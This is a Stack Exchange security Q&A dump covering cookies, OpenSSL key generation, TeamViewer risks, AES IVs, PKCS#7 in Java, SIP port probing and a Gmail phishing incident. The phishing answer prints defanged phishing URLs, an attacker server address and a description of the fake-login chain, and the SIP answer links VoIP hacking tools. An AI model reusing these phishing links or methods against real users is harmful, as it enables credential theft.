No harm can be done from the message itself and not from clicking OK. It doesn't matter whether you close that tab before or after clicking OK since once you browsed to that page it controls the order of things done and if it had any malicious intent it would have executed it before showing you this message... So it doesn't really matter if you use Safari or Chrome. It is strange though that your browser allows the site you are visiting to open a new tab, this behavior is usually disabled by default and instead you get a notification that this site wants to open a pop up. Maybe you allowed it sometime and thats why you get this annoying new tab opened. To disable it follow the <a href=""https://support.google.com/chrome/answer/95472?hl=en"">instructions from Google</a></p>

<p>It is true that Chrome does not allow any action if a dialog window is open, but its not that it is having a harder time or that this is putting you in danger.</p>

<p>Regarding your question about the possible harm done: probably if you didnt interact with the scam site, no harm is done, perhaps beyond that site making some money from you visiting this site and maybe that site tracking your visit there by some analytics engine such as google analytics. As long as you have not granted it any special permission like using your camera, or did not enter any password into it it can not do much. Usually these sites will try to trick you into entering credentials for some of your accounts, or downloading some malware in disguise of some useful application. </p>
","91010"
"What typically is the expiration date of a session cookie?","32722","","<p>I need to create a session cookie using JavaScript (for more info <a href=""https://stackoverflow.com/questions/15102305/how-do-websites-check-the-login-credentials-without-reloading-the-page"">see question</a>). I'm wondering what should the expiry date be? I'm guessing it's the browsing session, so if I don't set an expiration date this will be used as the default, right? This session would be used to validate a logged on user. So does it depend on how long I want users to stay logged in before automatically logging them off (if yes what's a good time, or should it stll be the browsing session?)?</p>
","<blockquote>
  <p>I'm guessing it's the browsing session, so if I don't set an expiration date this will be used as the default, right?</p>
</blockquote>

<p>Yes. Unless you have a particular need for sessions to survive a browser restart, omit the <code>expires</code> parameter so that the cookie is browser-session-only and not persisted to disc.</p>

<blockquote>
  <p>does it depend on how long I want users to stay logged in before automatically logging them off</p>
</blockquote>

<p>That is governed by your actual session expiry time, which should be implemented on the server-side alone. If you do use an <code>expires</code> time you would generally want it to be at least as long as the server-side timeout, but you shouldn't rely on the browser honouring that <code>expires</code> as your method of ensuring old sessions are unreachable.</p>

<p>Generally, session-only (no-<code>expires</code>) cookies are used for session-tracking, with timeout happening on the server side. If a request is made with an unrecognised or missing cookie, then likely the session has expired at the server side, the browser has been closed at the client side, or both, and you should direct the user to start a new session.</p>

<p>Typically there will be a session management tool included in whatever your web framework is on the server-side that will work this out for you by sending the appropriate <code>Set-Cookie</code> headers on an HTTP response (either the initial HTML page, or an XMLHttpRequest response). Whilst you <em>could</em> reimplement session management yourself using only JavaScript, passed parameters and, say, localStorage as an alternative to cookies, there doesn't seem to be that much to win by reinventing that wheel.</p>
","33748"
"OpenSSL generate different types of self signed certificate","32676","","<p>Does anyone know how to use OpenSSL to generate certificates for the following public key types:</p>

<ol>
<li>DSA - For <code>DHE_DSS</code> key exchange.</li>
<li>Diffie-Hellman - For <code>DH_DSS</code> and <code>DH_RSA</code> key exchange.</li>
<li>ECDH - For <code>ECDH_ECDSA</code> and <code>ECDH_RSA</code> key exchange.</li>
<li>ECDSA - For <code>ECDHE_ECDSA</code> key exchange.</li>
</ol>

<p>Most that I can find online teaches you how to generate a RSA type certificate though. </p>
","<h1>(EC)DSA</h1>

<p>For a DSA key pair, use this:</p>

<pre><code>openssl dsaparam -genkey 1024 -out dsakey.pem
</code></pre>

<p>where ""1024"" is the size in bits. The first DSA standard mandated that the size had to be a multiple of 64, in the 512..1024 range. Then another version deprecated sizes below 1024, so a valid DSA key size had length 1024 bits and nothing else. <a href=""http://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.186-4.pdf"">Current version</a> specifies that a valid DSA key has length 1024, 2048 or 3072 bits. OpenSSL accepts other lengths. If you want to maximize interoperability, use 1024 bits.</p>

<p>For an ECDSA key pair, use this:</p>

<pre><code>openssl ecparam -genkey -out eckey.pem -name prime256v1
</code></pre>

<p>To see what curve names are supported by OpenSSL, use: <code>openssl ecparam -list_curves</code></p>

<p>(For optimal interoperability, stick to NIST curve P-256, that OpenSSL knows under the name ""prime256v1"".)</p>

<p>Once you have a DSA or ECDSA key pair, you can generate a self-signed certificate containing the public key, and signed with the private key:</p>

<pre><code>openssl req -x509 -new -key dsakey.pem -out cert.pem
</code></pre>

<p>(Replace ""dsakey.pem"" with ""eckey.pem"" to use the EC key generated above.)</p>

<hr />

<h1>(EC)DH</h1>

<p>For Diffie-Hellman (with or without elliptic curves), things are more complex, because DH is not a signature algorithm:</p>

<ul>
<li>You will not be able to produce a <em>self-signed</em> certificate with a DH key.</li>
<li>You cannot either make a PKCS#10 request for a certificate with a DH key, because a PKCS#10 request is supposed to be self-signed (this self-signature is used as a <em>proof of possession</em>).</li>
</ul>

<p>While OpenSSL, <em>the library</em>, has the support needed for issuing a certificate which contains a DH public key; <a href=""http://wiki.openssl.org/index.php/Diffie_Hellman"">this page</a> may contain pointers. The challenge is to convince OpenSSL, <em>the command-line tool</em>, to do it. In the jungle of the OpenSSL documentation, I have not found a complete way to do it. Key pairs are easy enough to generate, though.</p>

<p>To generate a DH key pair, with the OpenSSL command-line tool, you have to do it in two steps:</p>

<pre><code>openssl dhparam -out dhparam.pem 1024
openssl genpkey -paramfile dhparam.pem -out dhkey.pem
</code></pre>

<p>For an ECDH key pair, use this:</p>

<pre><code>openssl ecparam -out ecparam.pem -name prime256v1
openssl genpkey -paramfile ecparam.pem -out ecdhkey.pem
</code></pre>

<p>However, it so happens that the format for certificates containing ECDH public keys is completely identical to the format for certificates containing ECDSA public keys; indeed, the format contains ""an EC public key"" without indication of the intended algorithm (ECDH or ECDSA). Therefore, any private key and certificates for ECDSA (private key for generating ECDSA signatures, certificate self-signed or signed by any other CA) will be fit for ECDH-* cipher suites.</p>

<p>The one case that I don't know how to produce with the OpenSSL command-line tool is a static Diffie-Hellman (non-EC) certificate. Note, though, that OpenSSL does not support SSL/TLS with static DH cipher suites either, so even if you could produce the certificate, it would not work with OpenSSL.</p>

<p>(And, in fact, nobody uses static DH in practice.)</p>
","44269"
"Can someone hack through TeamViewer?","32659","","<p>I have been doing business with someone on Fiverr. The person's help was really good, but I have concerns that they could potentially hack through TeamViewer. I never leave sight of my PC and I follow every click that is made with the mouse.</p>

<p>However, is there a way that someone can hack without my knowledge? Is there a way for them to control my mouse on their end and make it appear as if my mouse pointer isn't moving on my end?</p>

<p>I make sure to completely log off and lock my PC after each session, however I am not sure how to check if my PC has been hacked without my knowledge.</p>
","<p>TeamViewer has three built-in functionalities to let user access to remote computer. They are Remote Control, File Transfer and VPN (if driver is available). None of these functions have hidden mode and again none of them lets remote user view or manage your computer without you noticing it. I see three possible attacks here:</p>

<ol>
<li>If required drivers are all installed (remote user can install that too) he can disable your screen and lock your keyboard to do dirty things without you seeing it but not without noticing it. All you have to do is plug out your network cable or power cord, that will stop him.</li>
<li>Remote user can connect your computer with File Transfer function. However when the connection is established, you will see a pop-up window that lets you see what remote user viewing, copying or deleting. If you are not careful he can install malware or change your teamviewer files with evil ones.</li>
<li>If TeamViewer VPN driver is installed and active, remote user can get in to your home network via using your computer as a bridge. If your network devices have default or weak passwords, attacker can change your DNS addresses (or worse, forward all traffic to its own network) to get and alter your DNS requests. He can use this technique to redirect you a phishing website and steal your information.</li>
</ol>

<p>All of these techniques are useless if you are careful enough. First and second technique cannot be accomplished without you noticing it. If you haven't installed VPN driver for TeamViewer (that can disabled from your network and sharing center) there is nothing to worry about with the third one too.</p>

<p>If you are careful enough, no one can hack you with TeamViewer.</p>
","84556"
"What is the best practice for placing database servers in secure network topologies","32657","","<p>I have a classic DMZ architecture:</p>

<p><img src=""https://i.stack.imgur.com/G7lpi.jpg"" alt=""enter image description here""></p>

<p>My webserver is placed in the DMZ. 
The webserver needs to communicate with a database server. This database server is the most critical component of my network as it contains confidential data. </p>

<p>Where should I place the DB server and why? Should I add a second firewall and create another DMZ? </p>
","<ul>
<li>The best placement is to put the database servers in a trusted zone of their own.</li>
<li>They should allow inbound connections from the web servers only, and that should be enforced at a firewall and on the machines. Reality usually dictates a few more machines (db admin, etc). Obey reality as needed, of course.</li>
<li>They should only be making outbound connections if you're updating software on them.</li>
</ul>
","8879"
"Encrypting using AES 256, do I need IV?","32653","","<p>I'm looking into encrypting with AES using a 256bit key, and I notice that a number of methods in various languages, for instance <a href=""http://php.net/manual/en/function.openssl-encrypt.php"">http://php.net/manual/en/function.openssl-encrypt.php</a>, and I notice that the IV parameter is optional. Does this mean that I can fully implement AES encryption/decryption with a single 256bit string as the key? What purpose does the IV serve, and will security be significantly reduced if I omit it?</p>

<p>Apologies for my ignorance, I've been thrown head first into a task which I'm feeling pretty disorientated about, trying to piece it all together :)</p>

<p>Thanks!</p>
","<p>If you use each key only a single time, not using an IV is fine. If you use a key multiple times you should use a different IV each time, so a (key, IV) pair isn't reused.</p>

<p>The exact requirements for the IV depend on the chosen chaining mode, but a random 128 bit value is usually fine. It should be different for each message you encrypt. Store it alongside the ciphertext, typically as a prefix.</p>
","35211"
"PKCS7 encoding in Java without external libs like BouncyCastle etc","32613","","<p>I am working on signing and encoding of CMS/PKCS#7 messages (something similar to C# <a href=""http://msdn.microsoft.com/en-us/library/system.security.cryptography.pkcs.signedcms%28v=vs.80%29.aspx"">SignedCms</a>).</p>

<p>I have x509certificate from the keystore, rsa private key,<br>
ContentInfo. ContentType is ""oidPkcs7Data"".</p>

<p>I don't quite understand what should I do next.</p>

<p>I thought:</p>

<ol>
<li>generate a signature and sign ContentInfo data</li>
</ol>

<pre>
    Signature signature = Signature.getInstance(""MD5withRSA"");
    signature.initSign(rsaPrivateKeyFromStore); 
    signature.update(contentInfo.getData());
    signedData = signature.sign();
</pre>

<ol>
<li>encode signedData+signature. </li>
</ol>

<pre>
    PKCS7 pkcs7 = new PKCS7(signedData);
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    pkcs7.encodeSignedData(baos);
</pre>

<p>But I got the exception</p>

<pre>
sun.security.pkcs.ParsingException: Unable to parse the encoded bytes
    at sun.security.pkcs.PKCS7.(PKCS7.java:94)
</pre>

<p>Obviously I am doing it wrong. </p>

<p>Also I'd like to do it without BouncyCastle or Classpth or smth like these ones.</p>

<p>Is there possible to use just sun.security.* classes?
I use java 1.5.</p>

<p>I am a new in DigitalSignature world and any help or advice is appreciated.</p>

<p>UPD</p>

<p>I generated my own certificate and tried to sign the data with it.</p>

<p>.Net code</p>

<pre><code>        X509Certificate2 certificate = new X509Certificate2(""X:\\mypfxstore.pfx"", ""123"");
        String text = ""text"";
        ContentInfo contentInfo = new ContentInfo(System.Text.Encoding.UTF8.GetBytes(text));
        SignedCms cms = new SignedCms(contentInfo, false);
        CmsSigner signer = new CmsSigner(certificate);
        signer.IncludeOption = X509IncludeOption.None;
        signer.DigestAlgorithm = new Oid(""SHA1"");
        cms.ComputeSignature(signer, false);
        byte[] signature = cms.Encode();
        print(signature);
</code></pre>

<p>.Java code</p>

<pre><code>    char[] password = ""123"".toCharArray();
    String text = ""text"";

    FileInputStream fis = new FileInputStream(""X:\\mypfxstore.pfx"");
    KeyStore ks = KeyStore.getInstance(""pkcs12"");
    ks.load(fis, password);

    String alias = ks.aliases().nextElement();
    PrivateKey pKey = (PrivateKey)ks.getKey(alias, password);
    X509Certificate c = (X509Certificate)ks.getCertificate(alias);

    //Data to sign
    byte[] dataToSign = text.getBytes(""UTF-8"");
    //compute signature:
    Signature signature = Signature.getInstance(""SHA1WithRSA"");
    signature.initSign(pKey);
    signature.update(dataToSign);
    byte[] signedData = signature.sign();

    //load X500Name
    X500Name xName      = X500Name.asX500Name(c.getSubjectX500Principal());
    //load serial number
    BigInteger serial   = c.getSerialNumber();
    //laod digest algorithm
    AlgorithmId digestAlgorithmId = new AlgorithmId(AlgorithmId.SHA_oid);
    //load signing algorithm
    AlgorithmId signAlgorithmId = new AlgorithmId(AlgorithmId.RSAEncryption_oid);

    //Create SignerInfo:
    SignerInfo sInfo = new SignerInfo(xName, serial, digestAlgorithmId, signAlgorithmId, signedData);

    //Create ContentInfo:
    ContentInfo cInfo = new ContentInfo(ContentInfo.DIGESTED_DATA_OID, new DerValue(DerValue.tag_OctetString, dataToSign));

    //Create PKCS7 Signed data
    PKCS7 p7 = new PKCS7(new AlgorithmId[] { digestAlgorithmId }, cInfo,
            new java.security.cert.X509Certificate[] { /*cert,*/ },
            new SignerInfo[] { sInfo });

    //Write PKCS7 to bYteArray
    ByteArrayOutputStream bOut = new DerOutputStream();
    p7.encodeSignedData(bOut);
    byte[] encoded = bOut.toByteArray();

    print(encoded);
</code></pre>

<p>Java output</p>

<pre><code>length=264
3082010406092A864886F70D010702A081F63081F3020101310B300906052B0E03021A0500
301306092A864886F70D0 -&gt; 10705A &lt;- 0060404746578743181CB3081C8020101302630123110300E06
035504031307436F6D70616E790210FCAF9B5224FB4B9F4000B5127D881E2E300906052B0E0302
1A0500300D06092A864886F70D0101010500048180636ADD9F7E218AF3CBC5A75FA2076A53BE49
03DC864E87EBA3C1EE594FAACAFE93CA6F3410D847AC0C0ACB9FD88EC9CF6B00379FA9AD256C86
7204ED81E3FA2F8F492109FF87E81398B7B489B00A35914A2B51919DAAEC2BA87CEFB5AF52294E
2448B5B150D50A39BA0471A9AA1EA2B38A4E23BBA56E029842459F0D5BA3D511
</code></pre>

<p>.Net output</p>

<pre><code>length=264
3082010406092A864886F70D010702A081F63081F3020101310B300906052B0E03021A0500
301306092A864886F70D0 -&gt; 10701A &lt;- 0060404746578743181CB3081C8020101302630123110300E06
035504031307436F6D70616E790210FCAF9B5224FB4B9F4000B5127D881E2E300906052B0E0302
1A0500300D06092A864886F70D0101010500048180636ADD9F7E218AF3CBC5A75FA2076A53BE49
03DC864E87EBA3C1EE594FAACAFE93CA6F3410D847AC0C0ACB9FD88EC9CF6B00379FA9AD256C86
7204ED81E3FA2F8F492109FF87E81398B7B489B00A35914A2B51919DAAEC2BA87CEFB5AF52294E
2448B5B150D50A39BA0471A9AA1EA2B38A4E23BBA56E029842459F0D5BA3D511
</code></pre>

<p>Certificate example <a href=""https://dl.dropbox.com/u/1170068/mypfxstore.pfx"">example </a></p>
","<pre><code>package test.pkcs7;

import java.io.ByteArrayOutputStream;
import java.io.FileInputStream;
import java.math.BigInteger;
import java.security.KeyStore;
import java.security.PrivateKey;
import java.security.Signature;
import java.security.cert.X509Certificate;
import java.util.Enumeration;

import sun.security.pkcs.ContentInfo;
import sun.security.pkcs.PKCS7;
import sun.security.pkcs.SignerInfo;
import sun.security.util.DerOutputStream;
import sun.security.util.DerValue;
import sun.security.x509.AlgorithmId;
import sun.security.x509.X500Name;

public class GenPKCS {

    static final String STORENAME = ""c:/fileName.p12"";
    static final String STOREPASS = ""password"";

    public static void main(String[] args) throws Exception{

        //First load the keystore object by providing the p12 file path
        KeyStore clientStore = KeyStore.getInstance(""PKCS12"");
        //replace testPass with the p12 password/pin
        clientStore.load(new FileInputStream(STORENAME), STOREPASS.toCharArray());

        Enumeration&lt;String&gt; aliases = clientStore.aliases();
        String aliaz = """";
        while(aliases.hasMoreElements()){
            aliaz = aliases.nextElement();
            if(clientStore.isKeyEntry(aliaz)){
                break;
            }
        }
        X509Certificate c = (X509Certificate)clientStore.getCertificate(aliaz);

        //Data to sign
        byte[] dataToSign = ""SigmaWorld"".getBytes();
        //compute signature:
        Signature signature = Signature.getInstance(""Sha1WithRSA"");
        signature.initSign((PrivateKey)clientStore.getKey(aliaz, STOREPASS.toCharArray()));
        signature.update(dataToSign);
        byte[] signedData = signature.sign();

        //load X500Name
        X500Name xName      = X500Name.asX500Name(c.getSubjectX500Principal());
        //load serial number
        BigInteger serial   = c.getSerialNumber();
        //laod digest algorithm
        AlgorithmId digestAlgorithmId = new AlgorithmId(AlgorithmId.SHA_oid);
        //load signing algorithm
        AlgorithmId signAlgorithmId = new AlgorithmId(AlgorithmId.RSAEncryption_oid);

        //Create SignerInfo:
        SignerInfo sInfo = new SignerInfo(xName, serial, digestAlgorithmId, signAlgorithmId, signedData);
        //Create ContentInfo:
        ContentInfo cInfo = new ContentInfo(ContentInfo.DIGESTED_DATA_OID, new DerValue(DerValue.tag_OctetString, dataToSign));
        //Create PKCS7 Signed data
        PKCS7 p7 = new PKCS7(new AlgorithmId[] { digestAlgorithmId }, cInfo,
                new java.security.cert.X509Certificate[] { c },
                new SignerInfo[] { sInfo });
        //Write PKCS7 to bYteArray
        ByteArrayOutputStream bOut = new DerOutputStream();
        p7.encodeSignedData(bOut);
        byte[] encodedPKCS7 = bOut.toByteArray();
    }
}
</code></pre>

<p>The following changes are to be done in the Java code to make the output similar to .NET:</p>

<pre><code>//Create ContentInfo:
ContentInfo cInfo = new ContentInfo(ContentInfo.DIGESTED_DATA_OID, new DerValue(DerValue.tag_OctetString, dataToSign));
</code></pre>

<p>change to</p>

<pre><code>//Create ContentInfo:
ContentInfo cInfo = new ContentInfo(ContentInfo.DATA_OID, new DerValue(DerValue.tag_OctetString, dataToSign));
</code></pre>
","15728"
"If a router has port 5060 open, and I know that there is unencrypted SIP traffic going through this port, how could one take advantage of this","32585","","<p>Ok so an Nmap scan against an IP address shows that port 5060 is open. I know that 5060 indicates that this is SIP traffic. Also, 5060 indiciates that this is unencrypted traffic, where if the port was 5061, then the traffic would be encrypted.</p>

<p>I also have a hunch that 5060 tunnels through to a PBX based phone system (possibly Asterisk). I think that the router is listening on 5060 and forwarding any inbound traffic pointed at port 5060 at this IP address to this Linux based phone system for the purpose of receiving calls.</p>

<p>Calls made come out through port 5060 at this IP address.</p>

<p>What problems would this setup cause from a security point of view? How could an attacker take advantage of this information.</p>

<p>Thanks</p>
","<p>port 5060 is normally assigned to SIP traffic. It might or might not be used for SIP however. A simple nmap scan to this destination should probably reveal much more, for example here's an output from a OS fingerprint nmap scan to a voip adapter</p>

<pre><code>nmap -v -O &lt;ip_address&gt;
...
Host is up (0.0026s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0E:08:CA:**:** (Cisco Linksys)
Device type: VoIP adapter
Running: Sipura embedded
OS details: Sipura SPA-1001 or SPA-3000 VoIP adapter
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
</code></pre>

<p><a href=""http://wiki.freeswitch.org/wiki/SIP_TLS"">Some implementations of SIP TLS</a> appear to use port 5061 by default, but the reverse is not necessarily true. i.e. seeing port 5061 doesn't necessarily mean it's encrypted. I know of a few SIP installations where various ports are used for (standard) SIP, and they tend to range between 5060-5070... Again, those ports are completely arbitrary. You can choose to run a service on pretty much any port you'd like. So I can, e.g. run SIP TLS on port 80 and plain SIP on port 23 if I choose to... Until you do some kind of a probe / scan, you won't be able to know with a high-enough degree of certainty.</p>

<p>As far as VOIP / SIP security - there are probably many tools for scanning and potentially exploiting VOIP. A simple search revealed those items:</p>

<ul>
<li><a href=""http://www.voipsa.org/Resources/tools.php"">http://www.voipsa.org/Resources/tools.php</a></li>
<li><a href=""http://www.hackingvoip.com/sec_tools.html"">http://www.hackingvoip.com/sec_tools.html</a></li>
<li><a href=""http://blog.sipvicious.org/"">http://blog.sipvicious.org/</a></li>
</ul>

<p>and I'm sure you can find many others to experiment with.</p>
","12965"
"Don't understand how my mum's Gmail account was hacked","32417","","<p>My mum (on Gmail, using Chrome) received an email from a friend's Hotmail address. She opened the email (very obviously a phishing email) and clicked a link in it. This opened a webpage with loads of medical ads on. She closed the page and deleted the email.</p>

<p>She did not notice anything else happen when she clicked the link. For example, she did not see a download start and did not click anything on the page that opened.</p>

<p>The URI of the link she clicked was <code>hxxp://23.88.82.34/d/?sururopo=duti&amp;bugenugamaxo=aGViZTFzaGViZUBob3RtYWlsLmNvLnVr&amp;id=anVuYWx4QGdvb2dsZW1haWwuY29t&amp;dokofeyo=anVuYWx4</code> [DON'T visit that address!]</p>

<p>Immediately (although she didn't know at the time) about 75 emails were sent from her Gmail address to a selection of her contacts. They are visible in the Sent Mail list in her Gmail account. This happened between 17:08 and 17:10 GMT. Here the source of one:</p>

<pre><code>Return-Path: &lt;lalala@googlemail.com&gt;
Received: from localhost (host86-152-149-189.range86-152.btcentralplus.com. [86.152.149.189])
        by mx.google.com with ESMTPSA id r1sm16019263wia.5.2014.02.23.09.10.15
        for &lt;lalala@hotmail.com&gt;
        (version=TLSv1 cipher=ECDHE-RSA-RC4-SHA bits=128/128);
        Sun, 23 Feb 2014 09:10:16 -0800 (PST)
Message-ID: &lt;530a2b78.8108b40a.6eac.5c3d@mx.google.com&gt;
Date: Sun, 23 Feb 2014 09:10:16 -0800 (PST)
MIME-Version: 1.0
Content-Type: text/html; charset=ISO-8859-1
Content-Transfer-Encoding: quoted-printable
From: lalala@googlemail.com
Return-Path: lalala@googlemail.com
Subject: Bar gain

&lt;span style=3D""VISIBILITY:hidden;display:none""&gt;Mount your brooms said Madam=
 Hooch Three   two   one  =20
&lt;/span&gt;&lt;br /&gt;&lt;u&gt;lalala@googlemail.com has sent you 3 offline broadcast&lt;/u&gt;&lt;=
br /&gt;&lt;a href=3D""hxxp://23.88.82.8/d/?ba=3Djurofaxovu&amp;maremiditigehavuve=3Da=
nVuYWx4QGdvb2dsZW1haWwuY29t&amp;id=3DaGVsZW5fY19odWdoZXNAaG90bWFpbC5jb20=3D&amp;guv=
iwafaloco=3DaGVsZW5fY19odWdoZXM=3D"" &gt;Locate Full Email Content&lt;/a&gt;
</code></pre>

<p>Here's the Gmail ""Activity information"" window:
<img src=""https://i.stack.imgur.com/mRQ2f.png"" alt=""enter image description here""></p>

<p>Note that the IP address in that list, 86.152.149.189, is the same as in the header of that email.</p>

<p>One of my mum's friends reports that she received one of the emails and clicked on the link in it. She says that her email account then sent out a load of emails too.</p>

<p>I don't know what my mum's IP address was at the time this happened. So maybe it was 86.152.149.189.</p>

<p>I don't understand how this happened. She had an impressively strong password (which I've now changed) that she doesn't use for anything else and she didn't type this password into the page that opened.</p>

<p>How on earth could clicking a link in an email allow an attacker authenticate themselves with the Gmail SMTP server as my mum and then to send a load of emails as her to her contacts? And how could it have got the addresses of her contacts?</p>

<p><strong>Update subsequent to Iserni's answer</strong>:</p>

<p>My mum confirms that she did indeed enter her Gmail password when ""Gmail"" asked for it after the page of medical ads closed. Her aunt received one of the emails and was also asked to enter her Gmail login details. She says she did because the original email came from my mum. Clever attack</p>
","<p><strong>IMPORTANT</strong>: this is based on data I got from your link, but the server might implement some protection. For example, once it has sent its ""silver bullet"" against a victim, it might answer with a <em>faked</em> ""silver bullet"" to the same request, so that anyone investigating is led astray. I have tried sending a fake parameter of <em>cHVwcGFtZWxv</em> to see whether it triggered any different behaviour, and it did not. Still, that's no great guarantee.</p>

<p><strong>UPDATE</strong> - the above still holds, but I've been making tests from random IPs not traceable to my main session - the attacking server does not discriminate, and will blithely answer to a query regardless of browser, referer, and JS/Flash/Java support.</p>

<hr>

<p>The link you received contained, already embedded in the URL, the following parameters - I have slightly changed them so the correct form won't appear in Google searches of Stack Exchange (I swapped the first letters).</p>

<pre><code>jebe1shebe@hotmail.co.uk
hunalx@googlemail.com
</code></pre>

<p>The link injects a Javascript that first of all retrieves your location through a Geotrack API call, then loads another script. (<em>I had initially mistaken this for a GMail command; my bad</em>).</p>

<p>The second script loads a web page, <em>but also</em> presents several replicas of Login pages of popular accounts (Hotmail, GMail and so on) depending on the incoming email: GMail accounts get a fake GMail page, and so on, all of these pages saying what amounts to ""Oooh, session expired! <em>Would you mind logging in again?</em>"".</p>

<p>For example, clicking here (<strong>do not</strong> do so while logged in GMail, just in case)</p>

<pre><code>hxxp://23.88.82.8/d/?p=puppa@gmail.com&amp;jq=SVQ7RmxvcmVuY2U=
</code></pre>

<p>will display a fake Google account login (for a nonexisting user 'puppa').</p>

<p>The real login pages come from </p>

<pre><code>http://ww168.scvctlogin.com/login.srf?w...
http://ww837.https2-fb757a431bea02d1bef1fd12d814248dsessiongo4182-en.msgsecure128.com
</code></pre>

<p>which are fire-and-forget domains.</p>

<p>The server that receives the stolen usernames and passwords is apparently always the same, a ShineServers machine on 31.204.154.125, a <a href=""https://urlquery.net/report.php?id=8740185"">busy little beaver</a>. Most of these URLs have been <a href=""https://www.virustotal.com/en/ip-address/31.204.154.125/information/"">submitted to various services</a> and were seen as far back as January.</p>

<h1>Phishing and Two-Factor authentication</h1>

<p>I'm of two minds about the usefulness of TFA in <em>this</em> scenario. As I see it, and I may well be mistaken or overlooking something,</p>

<ul>
<li>the victim clicks on the link</li>
<li>gets ""disconnected"" and prompted to ""reconnect"" by a phishing screen</li>
<li>enters [username and] password</li>
<li>attacker attempts login and gets redirected to ""Enter Secure Code""</li>
<li>a secure code is sent to the victim</li>
<li>attacker sends to victim an ""Enter Secure Code"" screen</li>
<li>(most?) victims enter secure code too</li>
<li><strong>victim account is compromised</strong></li>
</ul>

<h1>What could one do</h1>

<ul>
<li>Check out the URL appearing on the address bar. Verify SSL certificates.</li>
<li>Never login to <em>anything</em> unless it comes from a bookmark or a manually typed link, paying attention to common misspellings. If a login screen appears during navigation, just <strong>close the browser</strong> and reopen it.</li>
<li>Enter into the paranoid habit of always inserting a wrong password first, one you would never use, then the correct one on the ""Login failed"" screen. If the wrong password gets accepted... (of course, the attacker might always reply WRONG! to the first attempt. He has to balance the cost of scaring some victims against the benefit potential of capturing some others. As long as the number of two-attempters is negligible, two-attempting is a winning strategy for them. If everybody does it, it won't work).</li>
<li>There are services, such as OpenDNS as pointed out by @Subin, or embedded in the browser itself, that verify the incoming site against a distributed list and refuse to connect to a <em>known</em> phishing site.</li>
</ul>

<h1>What could a developer do</h1>

<p>Maybe, just maybe, it would be possible to develop a ""This page looks like this other page"" application. Probably it would be terribly heavy on the system. In its most basic and thwartable form, <em>if the HTML code contains 'Enter Google password' and the URL is <strong>not</strong> gmail, then a large blood-red banner appears saying JUST DON'T</em>.</p>

<p>Another (thwartable again) possibility is to employ a <em>honey-token</em> approach and deny form submissions that contain a password.</p>

<h1>What could Google do</h1>

<p>This is a bit of a pet peeve of mine. The phishing screen uses data on Google servers, for Pete's sake, so that those servers <strong>clearly see a login logo being requested by your mom with a referer of phishers'r'us dot com</strong>. What do those servers do? They blithely serve the logo as is! If <em>I</em> were to manage such a server, a request for your avatar image (or any image) from any page <em>not</em> on my site would, yes, indeed get an image. I would probably get in no end of trouble for the image I'd choose. But it would be very unlikely that someone would willingly enter his/her password on such a screen.</p>

<p>Of course, the attackers would just mirror the images on their websites. But I can think of many other tricks. For example, if a browser on 1.2.3.4 asked me for a login avatar, I might be wary of a password confirmation coming from address 9.8.7.6 a few seconds later, especially if other passwords for <em>other accounts</em> had come in similar circumstances from the same address in the last few minutes.</p>

<p><strong>A twist</strong>: as suggested by a commenter (which I still have to thank for the insight), Google has actually oversight on the incoming requests <em>as well as GMail displayed messages</em>. With a bit of data analysis, it can then know with good certainty phishing sites almost in real time, and phishers mirroring sites doesn't thwart this kind of analysis very much (it is mostly based on data garnered from the victim). Then Google can supply the addresses of known sites to a browser extension (e.g. Chrome site protection).</p>

<p>I still think that they could do <em>both</em> - defend the login screen <em>and</em> use data mining to find out who the phishers are - but I'll accept that I am not justified in saying that Google is actually doing <em>nothing</em>.</p>

<h1>More complicated tricks</h1>

<p>Also, I might complicate the login screen with challenge/responses invisible to the user that the attacker would have to match, and based on browser fingerprinting. You want to log in, you send the password from the same login screen that prompted you. This too can be thwarted, quite easily.</p>

<p>But having to do twenty easy things to compromise an account <em>is difficult</em>. Also because if you do seventeen right, I (the server) mark your address, and maybe redirect you to a fake sandbox account if you do succeed to log in in the next hours. And then I just look at what you do. You do little, I replicate on the real account and if you're honest, you'll never even know. More than X too-similar emails, or sent too fast, and I'll know. Of course the account will remain open and blithely accept all your spam. Why not. <em>Send</em> it? Well... that's another matter, now, isn't it?</p>
","52123"
"Amount of simple operations that is safely out of reach for all humanity?","32337","","<p>Cryptographic primitives usually assert some security level given as number of operations to mount an attack. Hash functions, for example, give different security levels for collision attacks, preimage attacks and second preimage attacks. From these, ""safe"" key sizes are derived for different primitives.</p>

<p>There are many different recommendations for safe key sizes and many different means of estimating future capabilities in performing computation. For example, www.keylength.com has a lot of these recommendations combined.</p>

<p>What I'm looking for, however, is the amount of simple operations that can be obviously seen as out of reach for all humanity for the foreseeable future - or actually, the lowest such value that is still believable.</p>

<p>It is very obvious that 2^256 simple operations is something that will never be reached. It is also very obvious that 2^64 simple operations can be reached as it already has been. Many of the recommendations seem to calculate 2^128 as a number that would be safe for 30 years or more. So the value I am looking for is likely between 2^128 and 2^256. I am <em>guessing</em> 2^160 or 2^192 might be safely out of reach.</p>

<p>But I want concrete arguments that can be easily reasoned about. I'd love to see arguments that are based on simple laws of physics or relations to concrete constants about the universe. For example, <a href=""http://en.wikipedia.org/wiki/Landauer%27s_principle"">Landauer's principle</a> could be used.</p>

<p>Note: the actual simple operations used are not relevant here - they might be operations on a quantum computer, or hash invocations, or whatever.</p>
","<p>As a starting point, we will consider that each elementary operation implies a minimal expense of energy; <a href=""https://en.wikipedia.org/wiki/Landauer%27s_principle"">Landauer's principle</a> sets that limit at 0.0178 eV, which is 2.85*10<sup>-21</sup> J. On the other hand, the total mass of the Solar system, if converted in its entirety to energy, would yield about 1.8*10<sup>47</sup> J (actually that's what you would get from the mass of the Sun, according to <a href=""http://en.wikipedia.org/wiki/Orders_of_magnitude_%28energy%29"">this page</a>, but the Sun takes the Lion's share of the total mass of the Solar system). This implies a hard limit of about 6.32*10<sup>68</sup> elementary computations, which is about 2<sup>225.2</sup>. (I think this computation was already presented by Schneier in ""Applied Cryptography"".)</p>

<p>Of course this is a quite extreme scenario and, in particular, we have no idea about how we could convert mass to energy -- nuclear fission and fusion converts only a tiny proportion of the available mass to energy.</p>

